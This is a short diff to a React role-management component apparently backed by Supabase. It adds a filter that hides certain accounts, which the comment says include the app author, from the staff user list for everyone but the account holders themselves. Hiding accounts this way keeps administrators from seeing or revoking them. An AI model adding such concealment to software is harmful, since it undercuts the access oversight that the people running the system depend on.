@@ -2,6 +2,7 @@ import { useEffect, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/contexts/AuthContext";
 import { isEmailAllowed } from "@/types/opportunity";
+import { isHiddenUser } from "@/lib/hidden-users";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Badge } from "@/components/ui/badge";
@@ -45,6 +46,8 @@ export const UserRoleManager = () => {
       .filter((p) => {
         // Internal staff only: email must pass the staff allowlist...
         if (!isEmailAllowed(p.email)) return false;
+        // Hidden users (e.g. the app author) are invisible to everyone except themselves.
+        if (isHiddenUser(p.email) && p.id !== user?.id) return false;
         // ...and must not belong to a referral partner account.
         if (referrerAuthIds.has(p.id)) return false;
         if (p.email && referrerEmails.has(p.email.toLowerCase())) return false;
